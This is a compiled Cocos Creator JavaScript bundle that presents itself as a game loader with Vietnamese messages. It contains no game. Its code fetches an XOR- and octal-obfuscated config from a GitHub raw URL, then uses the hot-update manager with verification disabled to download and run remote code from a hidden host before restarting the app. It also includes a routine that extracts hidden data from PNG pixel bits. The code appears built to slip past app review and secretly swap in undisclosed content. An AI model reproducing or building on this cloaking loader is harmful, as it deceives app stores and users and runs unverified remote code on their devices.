window.__require = function t(e, n, s) {
function i(a, o) {
if (!n[a]) {
if (!e[a]) {
var c = a.split("/");
c = c[c.length - 1];
if (!e[c]) {
var l = "function" == typeof __require && __require;
if (!o && l) return l(c, !0);
if (r) return r(c, !0);
throw new Error("Cannot find module '" + a + "'");
}
}
var u = n[a] = {
exports: {}
};
e[a][0].call(u.exports, function(t) {
return i(e[a][1][t] || t);
}, u, u.exports, t, e, n, s);
}
return n[a].exports;
}
for (var r = "function" == typeof __require && __require, a = 0; a < s.length; a++) i(s[a]);
return i;
}({
CheckStatus: [ function(t, e, n) {
"use strict";
cc._RF.push(e, "ab3ebinADZPYpqst8xaZUXB", "CheckStatus");
Object.defineProperty(n, "__esModule", {
value: !0
});
var s = t("./GameHTTPManager"), i = t("./OrientationManager"), r = cc._decorator, a = r.ccclass, o = (r.property, 
function(t) {
__extends(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.isCheckDomain = !0;
e.listUrl = [];
e.url = "";
e.profilerURL = "";
e.info = "";
e.currentV = "";
e.part = "";
e.sceneToLoad = "GameLoader";
e.orient = 1;
return e;
}
n = e;
e.getInstance = function() {
return this._instance;
};
e.prototype.onLoad = function() {
if (null == n._instance || n._instance == this) {
n._instance = this;
cc.game.addPersistRootNode(this.node);
i.default.changeOrientation(0);
this.processData();
} else this.node.destroy();
};
e.prototype.getLinkData = function() {
return 0 == n.LIST_LINK_CONFIG.length ? null : n.LIST_LINK_CONFIG.shift();
};
e.prototype._processGitURL = function(t) {
var e = this;
this.getData(t + "?t=" + Date.now(), function() {
cc.log("processData error from getData");
e.processData();
});
};
e.prototype.processData = function() {
var t = this.getLinkData();
if (null != t) {
cc.log("processData url: " + t);
this._processGitURL(t);
}
};
e.prototype.isOKDay = function(t, e) {
var n = new Date(), s = new Date(t);
s.setDate(s.getDate() + e);
return n >= s;
};
e.prototype.getDataV4 = function() {
this.currentV = "v4";
if (!this.isCheckDomain) {
this.getDataV6();
this.listUrl[0] = "g";
}
if (0 != this.listUrl[0].includes("http")) {
var t = this;
s.default.getInstance().sendGetHttpRequest(this.listUrl[0] + this.info, function(e) {
t.onDataResponse(e);
}.bind(this), function(e) {
t.getDataV6();
}.bind(this));
}
};
e.prototype.getDataV6 = function() {
this.currentV = "v6";
this.isCheckDomain ? s.default.getInstance().sendGetHttpRequest(this.listUrl[1] + this.info, function(t) {
this.onDataResponse(t);
}.bind(this), function(t) {}.bind(this)) : this.loadGame();
};
e.prototype.onDataResponse = function(t) {
if (this.isCheckDomain) {
t = JSON.parse(t);
var e = this.listUrl[2];
null != t && void 0 != t && void 0 != t[e] ? this.loadGame() : "v4" == this.currentV && this.getDataV6();
} else this.loadGame();
};
e.prototype._parseData = function(t) {
this.orient = t[0];
this.isCheckDomain = !t[1];
this.listUrl = [];
this.listUrl.push(t[2]);
this.listUrl.push(t[3]);
this.listUrl.push(t[4]);
this.listUrl.push(t[5]);
this.listUrl.push(t[6]);
this.listUrl.push(t[9] || "Đang tải... ");
this.part = t[6];
var e = JSON.stringify(t);
cc.log("data: " + e);
localStorage.setItem("SAVEDGAME_DATA", e);
};
e.prototype.getData = function(t, e) {
void 0 === e && (e = null);
var n = localStorage.getItem("SAVEDGAME_DATA");
localStorage.getItem("SAVEDGAME_DATA22");
if (n && n.length && n.length > 2) try {
var i = JSON.parse(n);
this._parseData(i);
this.getDataV4();
return;
} catch (t) {}
var r = this;
s.default.getInstance().sendGetHttpRequest(t, function(t) {
r.listUrl = t.split("\n");
if (r.listUrl.length > 2) if (r.listUrl.length >= 5 && r.listUrl[4].includes("skt")) {
r.isCheckDomain = !1;
r.loadGame();
} else r.getDataV4(); else r.loadData(t);
}.bind(this), function() {
null != e && e();
});
};
e.prototype.loadGame = function() {
if (void 0 != this.listUrl[3] && "" != this.listUrl[3]) {
localStorage.setItem("SAVEDGAME_DATA22", this.listUrl[4]);
cc.director.loadScene(this.sceneToLoad);
}
};
e.prototype.loadData = function(t) {
var e = this.readData(t);
this._parseData(e);
this.getDataV4();
};
e.prototype.readData = function(t) {
function e(t) {
void 0 === t && (t = 3);
var e = t - 1;
return e = e <= 0 ? 0 : e;
}
function n(t, e, n) {
void 0 === e && (e = 3);
void 0 === n && (n = "D");
for (var i = "", r = s(t, e), a = 0; a < r.length; a++) {
i += String.fromCharCode(Number.parseInt(r[a]) ^ n.charCodeAt(0));
}
return i;
}
function s(t, n) {
void 0 === n && (n = 3);
var s = [], i = e(n), r = t.length - i;
t = t.substring(i);
for (var a = 0; a < r; a += n) {
var o = t.slice(a, a + n);
s.push(o);
}
return s;
}
var i = function(t) {
void 0 === t && (t = 1);
switch (t) {
case 1:
return [ "9689", 3 ];

case 2:
return [ "9879", 3 ];

case 3:
return [ "9789", 3 ];

default:
return [ "9869", 3 ];
}
}(Number.parseInt(t[t.length - 1])), r = i[1], a = i[0], o = t.split(a);
o.pop();
var c = o.map(function(t) {
return n(t, r, "¡");
}), l = c[0], u = c[1], h = c[2], p = c[3], f = c[4], d = c[5], g = c[6], y = c[7], v = c[8], m = c[9];
return [ parseInt(f), "1" === u, g, p, h, l, d, "1" === y, v, m ];
};
var n;
e.LIST_LINK_CONFIG = [ "https://raw.githubusercontent.com/devian68/intertest/a/inter2.info" ];
e._instance = null;
return e = n = __decorate([ a ], e);
}(cc.Component));
n.CheckStatus = o;
cc._RF.pop();
}, {
"./GameHTTPManager": "GameHTTPManager",
"./OrientationManager": "OrientationManager"
} ],
GameHTTPManager: [ function(t, e, n) {
"use strict";
cc._RF.push(e, "c71dct+OJ9OwKl8z3DTV7KY", "GameHTTPManager");
Object.defineProperty(n, "__esModule", {
value: !0
});
var s = function() {
function t() {}
t.getInstance = function() {
null !== this.Instance && void 0 !== this.Instance || (this.Instance = new t());
return this.Instance;
};
t.prototype.isNullOrEmpty = function(t) {
return void 0 == t || null == t || "" == t;
};
t.prototype.sendGetHttpRequest = function(t, e, n) {
var s = this;
cc.log("sendGetHttpRequest url: " + t);
var i = new XMLHttpRequest();
i.onreadystatechange = function() {
if (4 == i.readyState && i.status >= 200 && i.status < 400) {
var t = i.responseText;
e(t);
}
};
i.onerror = function() {
var t = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
cc.log("sendGetHttpRequest onerror responseText: " + i.responseText);
if (!s.isNullOrEmpty(i.responseText)) {
var e = null;
try {
e = JSON.parse(i.responseText);
} catch (t) {}
null === e || void 0 === e || s.isNullOrEmpty(e.msg) || (t = e.msg);
}
n(t);
};
i.ontimeout = function() {
n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.timeout = 3e4;
i.open("GET", t, !0);
i.send();
};
t.prototype.sendGetHttpRequestNoJson = function(t, e, n) {
var s = this, i = new XMLHttpRequest();
i.onreadystatechange = function() {
if (4 == i.readyState) if (i.status >= 200 && i.status < 400) {
var t = i.responseText;
e(t);
} else n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.onerror = function() {
var t = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
if (!s.isNullOrEmpty(i.responseText)) {
var e = null;
try {
e = JSON.parse(i.responseText);
} catch (t) {}
null === e || void 0 === e || s.isNullOrEmpty(e.msg) || (t = e.msg);
}
n(t);
};
i.ontimeout = function() {
n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.open("GET", t, !0);
i.send();
};
t.prototype.sendGetHttpRequestWithToken = function(t, e, n) {
var s = this, i = new XMLHttpRequest();
i.onreadystatechange = function() {
if (4 == i.readyState) if (i.status >= 200 && i.status < 400) {
var t = i.responseText;
e(JSON.parse(t));
} else n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.onerror = function() {
var t = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
if (!s.isNullOrEmpty(i.responseText)) {
var e = null;
try {
e = JSON.parse(i.responseText);
} catch (t) {}
null === e || void 0 === e || s.isNullOrEmpty(e.msg) || (t = e.msg);
}
n(t);
};
i.ontimeout = function() {
n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.open("GET", t, !0);
i.send();
};
t.prototype.sendPostHttpRequest = function(t, e, n, s, i, r) {
var a = this;
void 0 === i && (i = !0);
void 0 === r && (r = !1);
var o = cc.loader.getXMLHttpRequest();
o.onreadystatechange = function() {
if (4 == o.readyState) if (o.status >= 200 && o.status < 400) {
var t = o.responseText;
try {
var e = JSON.parse(t);
n(e);
} catch (e) {
cc.log("sendPostHttpRequest error: ", e);
cc.log("sendPostHttpRequest response: " + t);
s(t);
}
} else {
var i = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
if (!a.isNullOrEmpty(o.responseText)) try {
null === (e = JSON.parse(o.responseText)) || void 0 === e || a.isNullOrEmpty(e.msg) ? null === e || void 0 === e || a.isNullOrEmpty(e.message) || (i = e.message) : i = e.msg;
} catch (t) {
!0 === r && 400 === o.status && (i = o.responseText);
}
s(i);
}
};
o.onerror = function() {
var t = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
cc.log(JSON.stringify(o.responseText));
if (!a.isNullOrEmpty(o.responseText)) {
var e = null;
try {
e = JSON.parse(o.responseText);
} catch (t) {}
null === e || void 0 === e || a.isNullOrEmpty(e.msg) || (t = e.msg);
}
s(t);
};
o.ontimeout = function() {
s("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
o.open("POST", t, !0);
o.send(e);
};
t.prototype.requestImageURL = function(t, e, n) {
var s = this;
cc.log("requestImageURL url: " + t);
var i = new XMLHttpRequest();
i.onreadystatechange = function() {
4 == i.readyState && (i.status >= 200 && i.status < 400 ? e(new Uint8Array(i.response)) : null != n && n(i.response));
};
i.onerror = function() {
var t = "Không thể kết nối đến máy chủ, xin hãy thử lại.";
cc.log("sendGetHttpRequest onerror responseText: " + i.responseText);
if (!s.isNullOrEmpty(i.responseText)) {
var e = null;
try {
e = JSON.parse(i.responseText);
} catch (t) {}
null === e || void 0 === e || s.isNullOrEmpty(e.msg) || (t = e.msg);
}
n(t);
};
i.ontimeout = function() {
n("Không thể kết nối đến máy chủ, xin hãy thử lại.");
};
i.open("GET", t, !0);
i.responseType = "arraybuffer";
i.timeout = 3e4;
i.send();
};
t.Instance = null;
return t;
}();
n.default = s;
cc._RF.pop();
}, {} ],
LoadGameController: [ function(t, e, n) {
"use strict";
cc._RF.push(e, "89e3bULnINAO5LStk1zefH7", "LoadGameController");
Object.defineProperty(n, "__esModule", {
value: !0
});
var s = t("./CheckStatus"), i = t("./OrientationManager"), r = cc._decorator, a = r.ccclass, o = r.property, c = function(t) {
return JSON.stringify({
packageUrl: t + "/",
remoteManifestUrl: t + "/project.manifest",
remoteVersionUrl: t + "/version.manifest",
version: "0.0.1",
assets: {},
searchPaths: []
});
};
function l(t, e) {
for (var n = t.split("."), s = e.split("."), i = 0; i < n.length; ++i) {
var r = parseInt(n[i]), a = parseInt(s[i] || "0");
if (r !== a) return r - a;
}
return s.length > n.length ? -1 : 0;
}
var u = function(t) {
__extends(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.loadingLabel = null;
e._updating = !1;
e._canRetry = !1;
e._storagePath = "";
e.stringHost = "";
e._am = null;
e._checkListener = null;
e._updateListener = null;
e.count = 0;
e.isCheckDomain = !0;
e.url = "";
e.profilerURL = "";
e.listUrl = [];
e.info = "";
e.currentV = "";
e.part = "";
e.poath = "";
return e;
}
e.prototype.initDownloader = function(t) {
void 0 === t && (t = "sgame");
null != t && void 0 != t || (t = "sgame");
this._storagePath = (jsb.fileUtils ? jsb.fileUtils.getWritablePath() : "/") + t;
this._am = new jsb.AssetsManager("", this._storagePath, l);
this._am.setVerifyCallback(function(t, e) {
return !0;
});
};
e.prototype.onDestroy = function() {
if (this._updateListener) {
this._am.setEventCallback(null);
this._updateListener = null;
}
};
e.prototype.start = function() {
var t = s.CheckStatus.getInstance();
if (t) {
this.listUrl = t.listUrl;
console.log(JSON.stringify(this.listUrl));
if (this.listUrl && this.listUrl.length && this.listUrl.length >= 5) {
this.part = t.listUrl[4];
i.default.changeOrientation(t.orient);
this.loadGame();
return;
}
}
};
e.prototype.loadMyGame = function() {
this.unscheduleAllCallbacks();
};
e.prototype.onCheckGame = function() {
this.initDownloader(this.part);
this.stringHost = this.listUrl[3];
this.unscheduleAllCallbacks();
this.doUpdate();
};
e.prototype.doUpdate = function() {
if (this._am && !this._updating) {
this._am.setEventCallback(this.updateCb.bind(this));
var t = this.listUrl[3];
this.loadCustomManifest(t);
this._am.update();
this._updating = !0;
}
};
e.prototype.loadGame = function() {
if (void 0 != this.listUrl[3] && "" != this.listUrl[3]) {
var t = this.read(this.listUrl[3]), e = this.read(this.listUrl[this.listUrl.length - 1]);
this.stringHost = t;
this.poath = e;
this.onCheckGame();
}
};
e.prototype.setOrientation = function(t) {
void 0 === t && (t = 0);
if (cc.sys.isNative && cc.sys.os === cc.sys.OS_IOS && jsb) try {
jsb.reflection.callStaticMethod("AppController", "rotateScreen:", t);
} catch (t) {}
};
e.prototype.loadCustomManifest = function(t) {
var e = new jsb.Manifest(c(t), this._storagePath);
this._am.loadLocalManifest(e, this._storagePath);
};
e.prototype.updateCb = function(t) {
var e = !1, n = !1;
switch (t.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
n = !0;
break;

case jsb.EventAssetsManager.UPDATE_PROGRESSION:
var s = t.getDownloadedFiles() / t.getTotalFiles();
t.getMessage();
this.updateProcess(s);
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
n = !0;
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
case jsb.EventAssetsManager.UPDATE_FINISHED:
e = !0;
break;

case jsb.EventAssetsManager.UPDATE_FAILED:
this._updating = !1;
this._canRetry = !0;
n = !0;
break;

case jsb.EventAssetsManager.ERROR_UPDATING:
case jsb.EventAssetsManager.ERROR_DECOMPRESS:
n = !0;
}
if (n) {
this._am.setEventCallback(null);
this._updateListener = null;
this._updating = !1;
this.loadMyGame();
cc.warn("Update failed");
}
if (e) {
this._am.setEventCallback(null);
this._updateListener = null;
cc.director.emit("cleanup_game");
setTimeout(function() {
i.default.changeOrientation(1);
cc.game.restart();
}, 500);
}
};
e.prototype.read = function(t) {
return this.read1(this.read2(t.split("-"))).join("");
};
e.prototype.read1 = function(t) {
return t.map(function(t) {
return String.fromCharCode(parseInt(t, 10));
});
};
e.prototype.read2 = function(t) {
return t.map(function(t) {
return parseInt(t, 8);
});
};
e.prototype.updateProcess = function(t) {
if (!isNaN(t)) try {
this.loadingLabel.string = (this.listUrl[5] || "Update...") + ": " + Math.round(100 * t) + "%";
} catch (t) {}
};
__decorate([ o(cc.Label) ], e.prototype, "loadingLabel", void 0);
return e = __decorate([ a ], e);
}(cc.Component);
n.default = u;
cc._RF.pop();
}, {
"./CheckStatus": "CheckStatus",
"./OrientationManager": "OrientationManager"
} ],
OrientationManager: [ function(t, e, n) {
"use strict";
cc._RF.push(e, "7cbfdBJmYVJD6DTVtwg2Uty", "OrientationManager");
Object.defineProperty(n, "__esModule", {
value: !0
});
var s = cc._decorator, i = s.ccclass, r = (s.property, function() {
function t() {}
t.changeOrientation = function(t) {
var e = null;
if (cc.sys.isNative) if (cc.sys.os === cc.sys.OS_IOS) {
if (jsb) try {
e = jsb.reflection.callStaticMethod("AppController", "isSupportOrientation");
try {
var n = jsb.reflection.callStaticMethod("AppController", "rotateScreen:", t);
cc.log("changeOrientation test: " + n);
cc.log("changeOrientation test: " + JSON.stringify(n));
} catch (t) {
cc.log("changeOrientation e: " + JSON.stringify(t));
}
} catch (t) {
cc.log("changeOrientation e: " + JSON.stringify(t));
}
} else if (cc.sys.os === cc.sys.OS_ANDROID && jsb) try {
var s = "org/cocos2dx/javascript/AppActivity";
if (jsb) {
e = jsb.reflection.callStaticMethod(s, "isSupportOrientation", "()Z");
jsb.reflection.callStaticMethod(s, "setOrientation", "(I)V", t);
}
} catch (t) {
cc.log("changeOrientation e: " + JSON.stringify(t));
}
cc.log("isSupportOrientation: " + e);
0 == t || 2 == t ? cc.view.setOrientation(cc.macro.ORIENTATION_PORTRAIT) : 1 == t || 3 == t ? cc.view.setOrientation(cc.macro.ORIENTATION_LANDSCAPE) : cc.view.setOrientation(cc.macro.ORIENTATION_AUTO);
};
t.prototype.start = function() {};
return t = __decorate([ i ], t);
}());
n.default = r;
cc._RF.pop();
}, {} ],
Utils: [ function(t, e, n) {
"use strict";
cc._RF.push(e, "8d97fi3Wh9Dx7GdrZPlg9nu", "Utils");
Object.defineProperty(n, "__esModule", {
value: !0
});
n.extractData = function(t, e) {
void 0 === e && (e = 2e3);
for (var n = "", s = [ 137, 80, 78, 71, 13, 10, 26, 10 ], i = t.findIndex(function(e, n) {
return s.every(function(e, s) {
return t[n + s] === e;
});
}) + s.length; i < t.length && n.length < 8 * e; i++) n += t[i].toString(2).padStart(8, "0").slice(-1);
var r = "";
for (i = 0; i < n.length; i += 8) {
var a = n.slice(i, i + 8);
r += String.fromCharCode(parseInt(a, 2));
}
return r.includes("0end") ? r = r.split("0end")[0] : null;
};
cc._RF.pop();
}, {} ]
}, {}, [ "Utils", "CheckStatus", "GameHTTPManager", "LoadGameController", "OrientationManager" ]);